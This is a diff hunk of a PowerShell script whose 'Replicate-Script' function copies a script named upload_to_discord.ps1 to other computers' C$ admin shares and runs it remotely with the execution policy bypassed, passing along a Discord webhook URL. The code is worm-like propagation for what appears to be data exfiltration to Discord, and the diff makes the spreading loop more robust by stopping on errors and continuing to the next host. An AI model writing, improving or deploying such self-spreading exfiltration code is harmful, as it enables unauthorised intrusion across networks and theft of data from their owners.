@@ -75,15 +75,16 @@ function Replicate-Script {
     foreach ($computer in $computers) {
         try {
             # Copy the script to the target computer
-            Copy-Item -Path $scriptPath -Destination "\\$computer\C$\Windows\Temp\" -Force
+            Copy-Item -Path $scriptPath -Destination "\\$computer\C$\Windows\Temp\" -Force -ErrorAction Stop
 
             # Execute the script on the target computer
             Invoke-Command -ComputerName $computer -ScriptBlock {
                 param ($scriptPath, $webhookUrl)
                 powershell.exe -ExecutionPolicy Bypass -File $scriptPath
-            } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl -Credential (Get-Credential)
+            } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl -Credential (Get-Credential) -ErrorAction Stop
         } catch {
             Write-Host "Failed to replicate or execute on $computer: $_"
+            continue
         }
     }
 }
